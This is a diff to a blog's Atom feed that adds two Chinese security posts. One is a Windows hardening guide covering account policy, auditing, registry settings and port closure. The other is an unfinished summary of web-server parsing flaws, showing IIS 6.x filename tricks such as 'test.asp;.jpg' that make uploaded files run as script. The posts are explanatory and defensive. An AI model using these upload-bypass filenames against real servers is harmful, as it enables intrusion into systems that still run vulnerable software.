@@ -6,7 +6,7 @@
   <link href="https://hzktester.top/atom.xml" rel="self"/>
   
   <link href="https://hzktester.top/"/>
-  <updated>2020-09-29T09:07:18.587Z</updated>
+  <updated>2020-10-14T08:21:40.689Z</updated>
   <id>https://hzktester.top/</id>
   
   <author>
@@ -15,6 +15,459 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>windows操作系统加固</title>
+    <link href="https://hzktester.top/2020/10/14/%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA/windows%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%8A%A0%E5%9B%BA/"/>
+    <id>https://hzktester.top/2020/10/14/%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA/windows%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%8A%A0%E5%9B%BA/</id>
+    <published>2020-10-14T06:29:00.000Z</published>
+    <updated>2020-10-14T08:21:40.689Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="windows系统基本操作"><a href="#windows系统基本操作" class="headerlink" title="windows系统基本操作"></a>windows系统基本操作</h1><h2 id="windows常见目录"><a href="#windows常见目录" class="headerlink" title="windows常见目录"></a>windows常见目录</h2><table><thead><tr><th>路径</th><th>作用</th></tr></thead><tbody><tr><td>C:\Windows\System32</td><td>存放系统配置文件</td></tr><tr><td>C:\Windows\SysWOW64</td><td>Windows操作系统的子系统</td></tr><tr><td>C:\Windows\System32\config\SAM</td><td>存放windows帐号和密码</td></tr><tr><td>C:\Windows\System32\drivers\etc\hosts</td><td>DNS解析文件</td></tr><tr><td>C:\Program Files、C:\Program Files (x86)</td><td>64位系统安装在Windows操作系统的子系统,32位下会安装在x86下</td></tr><tr><td>C:\Windows\System32\winevt\Logs</td><td>日志目录</td></tr></tbody></table><h2 id="windows常用系统命令"><a href="#windows常用系统命令" class="headerlink" title="windows常用系统命令"></a>windows常用系统命令</h2><table><thead><tr><th>命令</th><th>说明</th></tr></thead><tbody><tr><td>ver</td><td>查看系统版本</td></tr><tr><td>hostname</td><td>查看主机名</td></tr><tr><td>ipconfig /all</td><td>查看网络配置</td></tr><tr><td>net user/localgroup/share/config</td><td>查看用户/用户组/共享/当前运行可配置服务</td></tr><tr><td>at</td><td>建立或查看系统作业</td></tr><tr><td>netstat</td><td>查看开放端口</td></tr><tr><td>secpol.msc</td><td>查看和修改本地安全设置</td></tr><tr><td>services.msc</td><td>查看和修改服务</td></tr><tr><td>eventvwr.msc</td><td>查看日志</td></tr><tr><td>regedit</td><td>打开注册表</td></tr><tr><td>whoami</td><td>查看当前操作用户的用户名</td></tr></tbody></table><h2 id="windows常见端口"><a href="#windows常见端口" class="headerlink" title="windows常见端口"></a>windows常见端口</h2><table><thead><tr><th>端口</th><th>说明</th></tr></thead><tbody><tr><td>80/8080/8081</td><td>HTTP协议代理服务器常用端口号</td></tr><tr><td>443</td><td>HTTPS协议代理服务器常用端口号</td></tr><tr><td>21</td><td>FTP(文件传输协议)协议代理服务器常用端口号</td></tr><tr><td>23</td><td>Telnet(远程登录)协议代理服务器常用端口号</td></tr><tr><td>22</td><td>SSH（安全登录）、SCP（文件传输）</td></tr><tr><td>1521</td><td>Oracle 数据库</td></tr><tr><td>1433</td><td>MS SQL SERVER数据库</td></tr><tr><td>1080</td><td>QQ</td></tr><tr><td>3306</td><td>Mysql数据库</td></tr><tr><td>25</td><td>SMTP（简单邮件传输协议）</td></tr></tbody></table><h2 id="net命令的使用"><a href="#net命令的使用" class="headerlink" title="net命令的使用"></a>net命令的使用</h2><table><thead><tr><th>命令</th><th>说明</th></tr></thead><tbody><tr><td>net user abc /add</td><td>创建（空密码）账户abc</td></tr><tr><td>net user abc</td><td>查看账户abc的详细信息</td></tr><tr><td>net user abc /del</td><td>删除账户abc</td></tr><tr><td>net user abc 123/add</td><td>创建普通账户abc，密码为123</td></tr><tr><td>net localgroup administrators abc /add</td><td>把abc用户加入管理员组</td></tr><tr><td>net localgroup administrators abc /del</td><td>把abc用户退出管理员组</td></tr><tr><td>net user abc /active:yes[no]</td><td>启用[停用]abc账户</td></tr><tr><td>net localgroup admin /add[del]</td><td>新建[删除]组admin</td></tr><tr><td>net share</td><td>查看本地开启的共享</td></tr><tr><td>netstat</td><td>查看开启哪些端口</td></tr></tbody></table><h1 id="windows系统加固"><a href="#windows系统加固" class="headerlink" title="windows系统加固"></a>windows系统加固</h1><p>账号安全是计算机系统安全的第一关，如果计算机系统账号被盗用，那<br>么计算机将非常危险，入侵者可以任意控制计算机系统，如果计算机中存在<br>着重要的机密文件，或者银行卡号和密码，那么损失会非常严重。</p><h2 id="账号及安全策略"><a href="#账号及安全策略" class="headerlink" title="账号及安全策略"></a>账号及安全策略</h2><p>账号安全设置方法：</p><p>“开始”—“运行”输入<code>secpol.msc</code>（控制面板——系统和安全——管理工具）</p><p>账号锁定策略：</p><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020101401.png" alt="image"></p><p>账号密码策略：</p><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020101402.png" alt="image"></p><h2 id="禁用Guest账户权限"><a href="#禁用Guest账户权限" class="headerlink" title="禁用Guest账户权限"></a>禁用Guest账户权限</h2><p>我的电脑—右击—管理—计算机管理—本地用户和组—用户—Guest—右键—属性—<br>常规—选择“账户已禁用”。</p><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020101403.png" alt="image"></p><p>或使用命令<code>net user guest /active:no</code>(cmd管理员模式执行)</p><h2 id="Administartor账号、组重命名"><a href="#Administartor账号、组重命名" class="headerlink" title="Administartor账号、组重命名"></a>Administartor账号、组重命名</h2><p><code>Administartor</code>账号、组重命名，可增加账号安全性</p><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020101404.png" alt="image"></p><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020101405.png" alt="image"></p><h2 id="日志及审核策略"><a href="#日志及审核策略" class="headerlink" title="日志及审核策略"></a>日志及审核策略</h2><p>“开始”—“运行”输入<code>secpol.msc</code>（控制面板——系统和安全——管理工具）</p><p>对重要事件进行审核记录，方便日后出现问题时查找问题根源。</p><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020101406.png" alt="image"></p><h3 id="调整事件日志的大小及覆盖策略"><a href="#调整事件日志的大小及覆盖策略" class="headerlink" title="调整事件日志的大小及覆盖策略"></a>调整事件日志的大小及覆盖策略</h3><p>设置方法：“开始”—“运行”输入<code>eventvwr.msc</code></p><p>增大日志大小，避免由于日志文件容量过小导致重要日志记录遗漏</p><table><thead><tr><th>日志类型</th><th>日志大小</th><th>覆盖策略</th></tr></thead><tbody><tr><td>应用程序</td><td>80000KB</td><td>覆盖早于30天的日志</td></tr><tr><td>安全日志</td><td>80000KB</td><td>覆盖早于30天的日志</td></tr><tr><td>系统日志</td><td>80000KB</td><td>覆盖早于30天的日志</td></tr></tbody></table><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020101407.png" alt="image"><br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020101408.png" alt="image"><br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020101409.png" alt="image"></p><blockquote><p>在一个完整的信息系统里面，日志系统是一个非常重要的功能组成部分。<br>它可以记录下系统所产生的所有行为，并按照某种规范表达出来。我们可以<br>使用日志系统所记录的信息为系统进行排错，优化系统的性能，或者根据这<br>些信息调整系统的行为。在安全领域，日志系统的重要地位尤甚，可以说是<br>安全审计方面最主要的工具之一。</p></blockquote><h2 id="安全选项策略设置"><a href="#安全选项策略设置" class="headerlink" title="安全选项策略设置"></a>安全选项策略设置</h2><p>本地安全策略-&gt;本地策略-&gt;安全选项</p><h3 id="Microsoft-网络服务器"><a href="#Microsoft-网络服务器" class="headerlink" title="Microsoft 网络服务器"></a>Microsoft 网络服务器</h3><ul><li><p>Microsoft 网络服务器：登录时间过期后断开与客户端的连接（启用）</p><blockquote><p>目的：可以避免用户在不适合的时间登录到系统,或者用户登录到系统后忘记退出登录</p></blockquote></li><li><p>Microsoft 网络服务器：暂停会话前所需的空闲时间数量（小于30分钟）</p><blockquote><p>目的：设置挂起会话之前所需的空闲时间为30分钟    </p></blockquote></li><li><p>Microsoft 网络客户端：将未加密的密码发送到第三方SMB服务期（禁用）</p><blockquote><p>目的：禁止发送未加密的密码到第三方SMB服务器</p></blockquote><p>  <img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020101410.png" alt="image"></p><h3 id="恢复控制台"><a href="#恢复控制台" class="headerlink" title="恢复控制台"></a>恢复控制台</h3></li><li><p>恢复控制台:允许软盘复制并访问所有驱动器和所有文件夹（禁用）</p><blockquote><p>目的：禁止它访问硬盘驱动器上的所有文件和目录。它仅允许访问每个卷的根目录%systemroot%目录及子目录，即使是这样它还限制不允许把硬盘驱动器上的文件拷贝到软盘上</p></blockquote></li><li><p>恢复控制台:允许自动系统管理级登录（禁用）</p><blockquote><p>目的：恢复控制台是Windows 2003的一个新特性，它在一个不能启动的系统上给出一个受限的命令行访问界面。可能会导致任何可以重起系统的人绕过账号口令限制和其它安全设置而访问系统</p></blockquote><p>  <img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020101411.png" alt="image"></p><h3 id="关机"><a href="#关机" class="headerlink" title="关机"></a>关机</h3></li><li><p>关机：清除虚拟内存页面文件（启用）</p><blockquote><p>目的：某些第三方的程序可能把一些没有加密的密码存在内存中，页面文件中也可能含有另外一些敏感的资料。关机的时候清除页面文件，防止造成意外的信息泄漏</p></blockquote></li><li><p>关机：允许系统在未登录的情况下关机（禁用）</p><blockquote><p>目的：防止连接远程桌面后恶意关机计算机</p></blockquote><p>  <img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020101412.png" alt="image"></p><h3 id="交互式登录"><a href="#交互式登录" class="headerlink" title="交互式登录"></a>交互式登录</h3></li><li><p>交互式登录：登陆时不显示用户名（启用）</p><blockquote><p>目的：登录时不显示上次登录的用户名，防止暴露用户名。</p></blockquote></li><li><p>交互式登录：无需按Ctrl+Alt+Del（禁用）</p><blockquote><p>目的：登录时需要按CTRL+ALT+DEL</p></blockquote></li><li><p>交互式登录：之前登录到缓存的次数（域控制器不可用时），设置为0</p><blockquote><p>目的：登陆时不显示上次的用户名，防止暴露用户名</p></blockquote><p>  <img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020101413.png" alt="image"></p><h3 id="审核"><a href="#审核" class="headerlink" title="审核"></a>审核</h3></li><li><p>审核：如果无法记录安全审核则立即关闭系统</p></li><li><p>审核：对全局系统对象的访问进行审核（启用）</p><p>  <img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020101414.png" alt="image"></p><h3 id="网络访问"><a href="#网络访问" class="headerlink" title="网络访问"></a>网络访问</h3></li><li><p>网络访问：不允许SAM帐户和共享的匿名枚举（启用）</p><blockquote><p>目的：禁止使用匿名用户空连接枚举系统敏感信息</p></blockquote></li><li><p>网络访问：不允许存储网络身份验证和密码和凭据（启用）</p></li><li><p>网络访问：本地账户的共享和安全模型（仅来宾–本地账户以来宾用户身份验证）</p></li><li><p>网络访问：可匿名访问的共享（全部删除）</p></li><li><p>网络访问：可匿名访问的命名管道 （全部删除）</p></li><li><p>网络访问：可远程访问的注册表路径（全部删除）</p></li><li><p>网络访问：可远程访问的注册表路径和子路径 （全部删除）</p><p>  <img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020101415.png" alt="image"></p></li></ul><h2 id="文件权限设置"><a href="#文件权限设置" class="headerlink" title="文件权限设置"></a>文件权限设置</h2><p>文件系统又被称作文件管理系统，它是指操作系统中负责管理和存储文件信息的软件机构。文件系统由与文件管理有关的软件、被管理的文件以及实施文件管理所需的数据结构这三部分构成。</p><p>从系统角度来看，文件系统是对文件存储器空间进行组织和分配，负责文件的存储并对存入的文件进行保护和检索的系统。具体地说，它负责为用户建立文件，存入、读出、修改、转储文件，控制文件的存取，当用户不再使用时撤销文件等。</p><table><thead><tr><th>路径</th><th>权限</th></tr></thead><tbody><tr><td>系统分区C盘</td><td>administrator、system完全控制</td></tr><tr><td>C:\Documents and Settings\</td><td>administrator、system完全控制</td></tr><tr><td>C:\windows\system32\</td><td>administrator读写</td></tr><tr><td>C:\progran files</td><td>为Common File目录之外的所有目录赋予Administrators 和SYSTEM 完全控制</td></tr><tr><td>C:\windows</td><td>系统管理员完全控制、system拒绝(继承)</td></tr><tr><td>C:\windows\system32</td><td>其关键程序只允许administrator完全控制</td></tr><tr><td>C:\Inetpub\</td><td>administrator、system完全控制，必要时可以删除该目录</td></tr><tr><td>网站目录所在磁盘</td><td>administrator、system完全控制</td></tr><tr><td>设置权限方法：</td><td></td></tr></tbody></table><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020101416.png" alt="image"></p><h2 id="注册表安全设置"><a href="#注册表安全设置" class="headerlink" title="注册表安全设置"></a>注册表安全设置</h2><p>通过注册表，用户可以轻易地添加、删除、修改windows系统内的软件<br>配置信息或硬件驱动程序，这不仅方便了用户对系统软硬件的工作状态进行<br>适时的调整，于此同时注册表也是入侵者攻击的目标，通过注册表也可称为入侵者攻击的目标，通过注册表种植木马、修改软件信息，甚至删除、停用<br>或改变硬件的工作状态。</p><table><thead><tr><th>注册表</th><th>说明</th></tr></thead><tbody><tr><td>HKEY_LOCAL_MACHINE</td><td>包含关于本地计算机系统的信息，包括硬件和操作系统数据</td></tr><tr><td>HKEY_LOCAL_ROOT</td><td>包含各种OLE技术使用的信息技术和文件类别关联数据</td></tr><tr><td>HKEY_LOCAL_USER</td><td>包含环境变量、桌面设置、网络连接、打印机和程序首选项</td></tr><tr><td>HKEY_LOCAL_USERS</td><td>包含关于动态加载的用户配置文件和默认的配置文件的信息。有 些信息和HKEY_CURRENT_USER交叉出现</td></tr><tr><td>HKEY_CURRENT_CONFIG</td><td>包含在启动时由本地计算机系统使用的硬件配置文件的相关信息</td></tr></tbody></table><h3 id="注册表权限"><a href="#注册表权限" class="headerlink" title="注册表权限"></a>注册表权限</h3><p>利用文件管理器对<code>regedit.exe</code>文件设置成只允许管理员能使用命令访问修改注册表，其他用户只能读取，但不是修改这样就可以防止非法用户恶意修改注册表。</p><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020101417.png" alt="image"></p><h3 id="禁止空链接"><a href="#禁止空链接" class="headerlink" title="禁止空链接"></a>禁止空链接</h3><p>禁用IPC连接，编辑注册表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa\restrictanonymous值为1</span><br></pre></td></tr></table></figure><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020101418.png" alt="image"></p><h3 id="删除系统默认共享"><a href="#删除系统默认共享" class="headerlink" title="删除系统默认共享"></a>删除系统默认共享</h3><p>删除服务器上的管理员共享</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKLM\System\CurrentControlSet\Services\LanmanServer\Parameters\AutoShareServer设置为0</span><br></pre></td></tr></table></figure><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020101419.png" alt="image"></p><p>使用<code>net share</code>命令查看默认共享</p><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020101420.png" alt="image"></p><p>使用<code>net share &lt;共享名&gt; /del</code>删除默认共享（管理员身份运行）</p><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020101421.png" alt="image"></p><h3 id="修改默认3389远程端口"><a href="#修改默认3389远程端口" class="headerlink" title="修改默认3389远程端口"></a>修改默认3389远程端口</h3><p>修改注册表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\Tds\tcp\PortNumber</span><br></pre></td></tr></table></figure><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020101422.png" alt="image"></p><h2 id="关闭135-139-445隐患端口"><a href="#关闭135-139-445隐患端口" class="headerlink" title="关闭135 139 445隐患端口"></a>关闭135 139 445隐患端口</h2><h3 id="关闭135端口"><a href="#关闭135端口" class="headerlink" title="关闭135端口"></a>关闭135端口</h3><p>”开始“–“运行”，输入”dcomcnfg”，单击“确定”，打开组件服务</p><p>右键我的电脑，单击”属性”，在默认属性中 <strong>去掉 在此计算机上启用分布式COM</strong> 前打勾<br>选择”默认协议”选项卡，<strong>移除“面向连接的TCP/IP”</strong>，单击”确定”按钮，设置完成，重新启动后即可关闭135端口</p><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020101423.png" alt="image"></p><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020101424.png" alt="image"></p><h3 id="关闭139端口"><a href="#关闭139端口" class="headerlink" title="关闭139端口"></a>关闭139端口</h3><p>右键我的”网上邻居“，单击”属性“，再打开本地连接的”属性</p><p>选中Internet协议(TCP/IP),常规选项卡-高级</p><p>设置WINS选项卡”禁用TCP/IP上的NETBIOS”</p><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020101425.png" alt="image"></p><h3 id="关闭445端口"><a href="#关闭445端口" class="headerlink" title="关闭445端口"></a>关闭445端口</h3><p>修改注册表，添加一个键值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\NetBT\Parameters在右面的窗口</span><br><span class="line">新建一个SMBDeviceEnabled 为REG_DWORD类型键值为 0。</span><br></pre></td></tr></table></figure><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020101426.png" alt="image"></p>]]></content>
+    
+    
+    <summary type="html">&lt;h1 id=&quot;windows系统基本操作&quot;&gt;&lt;a href=&quot;#windows系统基本操作&quot; class=&quot;headerlink&quot; title=&quot;windows系统基本操作&quot;&gt;&lt;/a&gt;windows系统基本操作&lt;/h1&gt;&lt;h2 id=&quot;windows常见目录&quot;&gt;&lt;a href=&quot;#windows常见目录&quot; class=&quot;headerlink&quot; title=&quot;windows常见目录&quot;&gt;&lt;/a&gt;windows常见目录&lt;/h2&gt;&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;路径&lt;/th&gt;
+&lt;th&gt;作用&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;&lt;tr&gt;
+&lt;td&gt;C:\Windows\System32&lt;/td&gt;
+&lt;td&gt;存放系统配置文件&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;C:\Windows\SysWOW64&lt;/td&gt;
+&lt;td&gt;Windows操作系统的子系统&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;C:\Windows\System32\config\SAM&lt;/td&gt;
+&lt;td&gt;存放windows帐号和密码&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;C:\Windows\System32\drivers\etc\hosts&lt;/td&gt;
+&lt;td&gt;DNS解析文件&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;C:\Program Files、C:\Program Files (x86)&lt;/td&gt;
+&lt;td&gt;64位系统安装在Windows操作系统的子系统,32位下会安装在x86下&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;C:\Windows\System32\winevt\Logs&lt;/td&gt;
+&lt;td&gt;日志目录&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;&lt;/table&gt;
+&lt;h2 id=&quot;windows常用系统命令&quot;&gt;&lt;a href=&quot;#windows常用系统命令&quot; class=&quot;headerlink&quot; title=&quot;windows常用系统命令&quot;&gt;&lt;/a&gt;windows常用系统命令&lt;/h2&gt;&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;命令&lt;/th&gt;
+&lt;th&gt;说明&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;&lt;tr&gt;
+&lt;td&gt;ver&lt;/td&gt;
+&lt;td&gt;查看系统版本&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;hostname&lt;/td&gt;
+&lt;td&gt;查看主机名&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;ipconfig /all&lt;/td&gt;
+&lt;td&gt;查看网络配置&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;net user/localgroup/share/config&lt;/td&gt;
+&lt;td&gt;查看用户/用户组/共享/当前运行可配置服务&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;at&lt;/td&gt;
+&lt;td&gt;建立或查看系统作业&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;netstat&lt;/td&gt;
+&lt;td&gt;查看开放端口&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;secpol.msc&lt;/td&gt;
+&lt;td&gt;查看和修改本地安全设置&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;services.msc&lt;/td&gt;
+&lt;td&gt;查看和修改服务&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;eventvwr.msc&lt;/td&gt;
+&lt;td&gt;查看日志&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;regedit&lt;/td&gt;
+&lt;td&gt;打开注册表&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;whoami&lt;/td&gt;
+&lt;td&gt;查看当前操作用户的用户名&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;&lt;/table&gt;
+&lt;h2 id=&quot;windows常见端口&quot;&gt;&lt;a href=&quot;#windows常见端口&quot; class=&quot;headerlink&quot; title=&quot;windows常见端口&quot;&gt;&lt;/a&gt;windows常见端口&lt;/h2&gt;&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;端口&lt;/th&gt;
+&lt;th&gt;说明&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;&lt;tr&gt;
+&lt;td&gt;80/8080/8081&lt;/td&gt;
+&lt;td&gt;HTTP协议代理服务器常用端口号&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;443&lt;/td&gt;
+&lt;td&gt;HTTPS协议代理服务器常用端口号&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;21&lt;/td&gt;
+&lt;td&gt;FTP(文件传输协议)协议代理服务器常用端口号&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;23&lt;/td&gt;
+&lt;td&gt;Telnet(远程登录)协议代理服务器常用端口号&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;22&lt;/td&gt;
+&lt;td&gt;SSH（安全登录）、SCP（文件传输）&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;1521&lt;/td&gt;
+&lt;td&gt;Oracle 数据库&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;1433&lt;/td&gt;
+&lt;td&gt;MS SQL SERVER数据库&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;1080&lt;/td&gt;
+&lt;td&gt;QQ&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;3306&lt;/td&gt;
+&lt;td&gt;Mysql数据库&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;25&lt;/td&gt;
+&lt;td&gt;SMTP（简单邮件传输协议）&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;&lt;/table&gt;
+&lt;h2 id=&quot;net命令的使用&quot;&gt;&lt;a href=&quot;#net命令的使用&quot; class=&quot;headerlink&quot; title=&quot;net命令的使用&quot;&gt;&lt;/a&gt;net命令的使用&lt;/h2&gt;&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;命令&lt;/th&gt;
+&lt;th&gt;说明&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;&lt;tr&gt;
+&lt;td&gt;net user abc /add&lt;/td&gt;
+&lt;td&gt;创建（空密码）账户abc&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;net user abc&lt;/td&gt;
+&lt;td&gt;查看账户abc的详细信息&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;net user abc /del&lt;/td&gt;
+&lt;td&gt;删除账户abc&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;net user abc 123/add&lt;/td&gt;
+&lt;td&gt;创建普通账户abc，密码为123&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;net localgroup administrators abc /add&lt;/td&gt;
+&lt;td&gt;把abc用户加入管理员组&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;net localgroup administrators abc /del&lt;/td&gt;
+&lt;td&gt;把abc用户退出管理员组&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;net user abc /active:yes[no]&lt;/td&gt;
+&lt;td&gt;启用[停用]abc账户&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;net localgroup admin /add[del]&lt;/td&gt;
+&lt;td&gt;新建[删除]组admin&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;net share&lt;/td&gt;
+&lt;td&gt;查看本地开启的共享&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;netstat&lt;/td&gt;
+&lt;td&gt;查看开启哪些端口&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;&lt;/table&gt;
+&lt;h1 id=&quot;windows系统加固&quot;&gt;&lt;a href=&quot;#windows系统加固&quot; class=&quot;headerlink&quot; title=&quot;windows系统加固&quot;&gt;&lt;/a&gt;windows系统加固&lt;/h1&gt;</summary>
+    
+    
+    
+    <category term="安全加固" scheme="https://hzktester.top/categories/%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA/"/>
+    
+    
+    <category term="windows系统加固" scheme="https://hzktester.top/tags/windows%E7%B3%BB%E7%BB%9F%E5%8A%A0%E5%9B%BA/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Web中间件常见解析漏洞总结</title>
+    <link href="https://hzktester.top/2020/10/12/Web%E5%9F%BA%E7%A1%80/Web%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%B8%B8%E8%A7%81%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"/>
+    <id>https://hzktester.top/2020/10/12/Web%E5%9F%BA%E7%A1%80/Web%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%B8%B8%E8%A7%81%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/</id>
+    <published>2020-10-12T09:31:00.000Z</published>
+    <updated>2020-10-14T02:54:57.865Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="IIS"><a href="#IIS" class="headerlink" title="IIS"></a>IIS</h1><p><code>IIS</code>是<code>Internet Information Services</code>的缩写，意为互联网信息服务，是由微软公司提供的基于运行<code>Microsoft Windows</code>的互联网基本服务。</p><blockquote><p>IIS目前只适用于Windows系统，不适用于其他操作系统。</p></blockquote><h2 id="IIS-6-x"><a href="#IIS-6-x" class="headerlink" title="IIS 6.x"></a>IIS 6.x</h2><h3 id="文件名解析漏洞"><a href="#文件名解析漏洞" class="headerlink" title="文件名解析漏洞"></a>文件名解析漏洞</h3><p>该版本默认会将<code>*.asp;.jpg</code>此种格式的文件名，当成<code>Asp</code>解析，原理是 服务器默认不解析<code>;</code>号及其后面的内容，相当于截断。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.x.x&#x2F;test.asp;.jpg</span><br></pre></td></tr></table></figure><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020101201.png" alt="image"></p><h3 id="文件夹名解析漏洞"><a href="#文件夹名解析漏洞" class="headerlink" title="文件夹名解析漏洞"></a>文件夹名解析漏洞</h3><p>该版本默认会将<code>*.asp/</code>目录下的所有文件当成<code>Asp</code>解析。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.x.x&#x2F;test.asp&#x2F;xxx.jpg</span><br></pre></td></tr></table></figure><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020101202.png" alt="image"></p><p>另外，<code>IIS6.x</code>除了会将扩展名为<code>.asp</code>的文件解析为<code>asp</code>之外，还默认会将扩展名为<code>.asa</code>，<code>.cdx</code>，<code>.cer</code>解析为<code>asp</code></p><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020101203.png" alt="image"></p><h3 id="修复建议"><a href="#修复建议" class="headerlink" 